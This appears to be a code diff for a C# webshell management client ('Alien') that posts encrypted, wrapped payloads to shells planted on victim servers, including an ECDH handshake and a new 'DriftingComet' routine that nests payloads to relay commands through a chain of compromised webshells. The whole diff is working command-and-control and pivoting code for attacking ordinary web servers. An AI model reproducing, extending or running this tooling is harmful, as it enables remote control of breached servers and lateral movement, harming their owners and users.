@@ -24,6 +24,7 @@ namespace Alien
         public clsVictim m_victim { get; init; }
         public clsTamper m_tamper { get; set; }
         public HttpClient m_clnt { get; set; }
+        private clsSqlite m_sqlConn { get; init; }
 
         private AesGcm m_aesgcm { get; set; }
         private string m_szSessionToken { get; set; }
@@ -302,12 +303,13 @@ namespace Alien
             { enLanguage.JSP, szInput => szInput } // nop
         };
 
-        public clsWeb(clsVictim victim, clsTamper tamper)
+        public clsWeb(clsVictim victim, clsTamper tamper, clsSqlite sqlConn)
         {
             Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
 
             m_victim = victim;
             m_tamper = tamper;
+            m_sqlConn = sqlConn;
 
             var cookieContainer = new CookieContainer();
             var handler = new HttpClientHandler()
@@ -489,7 +491,7 @@ namespace Alien
         /// <param name="szPayloadData"></param>
         /// <param name="szSplitter"></param>
         /// <returns></returns>
-        public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
+        public async Task<string> fnHttpPOST(stShellConfig config, string szPayloadData, string szSplitter)
         {
             HttpContent? content = null;
             HttpResponseMessage resp;
@@ -498,12 +500,15 @@ namespace Alien
             try
             {
                 // Encryption is enabled
-                if (m_victim.ShellPayloadType == enPayloadType.ECDH)
+                if (string.IsNullOrEmpty(config.ID))
+                    config = m_victim.m_ShellConfig;
+
+                if (config.payloadType == enPayloadType.ECDH)
                 {
                     // Handshake
                     if (!bTokenExisted)
                     {
-                        var httpResp = await fnGetJson(m_victim.ShellURL);
+                        var httpResp = await fnGetJson(config.szUrl);
 
                         string szSignPubPem = httpResp.GetProperty("signPubKey").GetString().Trim();
                         string szServerEcdhPem = httpResp.GetProperty("serverEcdhPub").GetString().Trim();
@@ -542,7 +547,7 @@ namespace Alien
                                 DSASignatureFormat.Rfc3279DerSequence
                             );
 
-                            var handshakeResp = await fnPostJson(m_victim.ShellURL, new
+                            var handshakeResp = await fnPostJson(config.szUrl, new
                             {
                                 handshakeToken = szHandshakeToken,
                                 clientEcdhPub = szEcdhPubPem,
@@ -614,12 +619,12 @@ namespace Alien
 
                     content = new StringContent(
                         szPayloadData,
-                        Encoding.GetEncoding(m_victim.ShellEncoding),
-                        m_victim.m_ShellConfig.bWHEnable ? "text/plain" : "application/x-www-form-urlencoded"
+                        Encoding.GetEncoding(config.szEncoding),
+                        config.bEHEnable ? "text/plain" : "application/x-www-form-urlencoded"
                     );
                 }
 
-                resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
+                resp = await m_clnt.PostAsync(config.szUrl, content);
                 szRespContent = await resp.Content.ReadAsStringAsync();
 
                 //MessageBox.Show(szRespContent);
@@ -628,7 +633,6 @@ namespace Alien
                 {
                     if (m_victim.m_ShellConfig.bEHEnable)
                     {
-                        var config = m_victim.m_ShellConfig;
                         if (config.bEHEnable)
                         {
                             var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
@@ -658,7 +662,7 @@ namespace Alien
                     }
                     catch
                     {
-                        m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
+                        m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                         return string.Empty;
                     }
                 }
@@ -707,13 +711,13 @@ namespace Alien
                     }
                     catch (Exception ex)
                     {
-                        m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
+                        m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                         return string.Empty;
                     }
                 }
                 else
                 {
-                    m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
+                    m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                     return string.Empty;
                 }
             }
@@ -935,7 +939,8 @@ namespace Alien
                 }
             }
 
-            string szPayload = await fnGetPayload(szPayloadName, szSplitter, asParams);
+            var config = m_victim.m_ShellConfig;
+            string szPayload = await fnGetPayload(config, szPayloadName, szSplitter, asParams);
 
             if (szPayload.Contains("[ENCODING]"))
                 szPayload = szPayload.Replace("[ENCODING]", m_victim.ShellEncoding);
@@ -947,7 +952,6 @@ namespace Alien
             else
             {
                 //OneShell
-                var config = m_victim.m_ShellConfig;
 
                 for (int i = 0; i < asParams.Length; i++)
                 {
@@ -979,26 +983,19 @@ namespace Alien
 
             }
 
-            return await fnHttpPOST(szPayload, szSplitter);
-        }
+            if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
+            {
+                var configs = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
+                var result = await fnDriftingComet(configs, Uri.UnescapeDataString(szPayload));
 
-        public async Task<byte[]> fnabSendPayload(string szPayloadName, string[] asParams)
-        {
-            string szSplitter = clsEzData.fnszGenerateRandomStr();
-            string szPayload = await fnGetPayload(szPayloadName, szSplitter);
+                string[] s = result.szComet.Split('=');
+                szPayload = string.Join("=", s[1..]);
+                szPayload = Uri.EscapeDataString(szPayload);
 
-            for (int i = 0; i < asParams.Length; i++)
-                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
+                return await fnHttpPOST(result.config, $"{s[0]}={szPayload}", szSplitter);
+            }
 
-            string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
-
-            string szMain = m_dicEncapusulator[m_victim.ShellLanguage](szPayload);
-            string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", szMain);
-            string szParams = string.Join("&", asParams);
-
-            szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
-
-            return await fnabHttpPOST(szPayload, szSplitter);
+            return await fnHttpPOST(new stShellConfig(), szPayload, szSplitter);
         }
 
         /// <summary>
@@ -1006,22 +1003,22 @@ namespace Alien
         /// </summary>
         /// <param name="szPayloadName">Payload name, also represents to file name.</param>
         /// <returns>Payload content</returns>
-        private async Task<string> fnGetPayload(string szPayloadName, string szSplitter, string[] asParams = null)
+        private async Task<string> fnGetPayload(stShellConfig config, string szPayloadName, string szSplitter, string[] asParams = null)
         {
-            string szSuffix = m_dicPayloadExtension[m_victim.ShellLanguage];
+            string szSuffix = m_dicPayloadExtension[config.language];
             string szPayloadFilePath = Path.Combine(new string[]
             {
                 "Payload",
-                m_victim.ShellLanguage.ToString(),
-                m_victim.ShellMethod,
-                m_victim.ShellPayloadType.ToString(),
+                config.language.ToString(),
+                config.szMethod,
+                config.payloadType.ToString(),
                 $"{szPayloadName}.{szSuffix}",
             });
 
             if (File.Exists(szPayloadFilePath))
             {
                 string szPayload = File.ReadAllText(szPayloadFilePath);
-                foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
+                foreach (string szPattern in m_dicRemoveSyntax[config.language])
                 {
                     if (string.IsNullOrEmpty(szPattern))
                         continue;
@@ -1030,12 +1027,11 @@ namespace Alien
                 }
 
 
-                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
+                string szSplitFunc = m_dicSplitter[config.language].Replace("SPLITTER", szSplitter);
                 szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";
 
-                if (m_dicWrapper.ContainsKey(m_victim.ShellLanguage))
+                if (m_dicWrapper.ContainsKey(config.language))
                 {
-                    var config = m_victim.m_ShellConfig;
                     string szEncryptor = string.Empty;
                     if (config.bEHEnable && !string.IsNullOrEmpty(config.szEventHorizonScript))
                     {
@@ -1055,11 +1051,11 @@ namespace Alien
                         
                     }
 
-                    string szMethod = m_victim.m_ShellConfig.szMethod;
-                    szPayload = m_dicWrapper[m_victim.ShellLanguage](szMethod)(szPayload, szEncryptor);
+                    string szMethod = config.szMethod;
+                    szPayload = m_dicWrapper[config.language](szMethod)(szPayload, szEncryptor);
 
                     if (szPayloadName.Equals("eval"))
-                        asParams[0] = m_dicWrapper[m_victim.ShellLanguage](szMethod)(asParams[0], "*");
+                        asParams[0] = m_dicWrapper[config.language](szMethod)(asParams[0], "*");
                 }
 
                 //MessageBox.Show(szPayload);
@@ -1071,6 +1067,54 @@ namespace Alien
                 MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return string.Empty;
             }
+        }
+
+        private async Task<(stShellConfig config, string? szURL, string? szComet)> fnDriftingComet(List<stShellConfig> lsConfig, string? szPayload)
+        {
+            string szSplitter = clsEzData.fnszGenerateRandomStr();
+
+            if (string.IsNullOrEmpty(szPayload))
+                throw new Exception("Payload is null or empty");
+
+            string szCurrentPayload = szPayload;
+
+            stShellConfig finalTargetConfig = new stShellConfig();
+            string szFinalURL = string.Empty;
+
+            for (int i = 0; i < lsConfig.Count; i++)
+            {
+                var config = lsConfig[i];
+                string szPassword = config.szPassword;
+
+                if (config.bEHEnable)
+                {
+                    
+                }
+                else
+                {
+                    string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
+
+                    if (string.IsNullOrEmpty(szCurrentTemplate))
+                        throw new Exception("Comet payload is null or empty");
+
+                    string szMergedComet = clsTamper.fnMergePayloadToOne(
+                        szCurrentTemplate,
+                        new string[] {
+                            clsEzData.fnszStre2b64(i == 0 ? m_victim.ShellURL : lsConfig[i-1].szUrl),
+                            clsEzData.fnszStre2b64(szCurrentPayload)
+                        },
+                        config.language
+                    );
+
+                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod).Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet));
+                    szCurrentPayload = $"{szPassword}={szCurrentLayer}";
+                }
+
+                finalTargetConfig = config;
+                szFinalURL = config.szUrl;
+            }
+
+            return (finalTargetConfig, szFinalURL, szCurrentPayload);
         }
 
         private byte[]? fnGetNebulaPulsar()
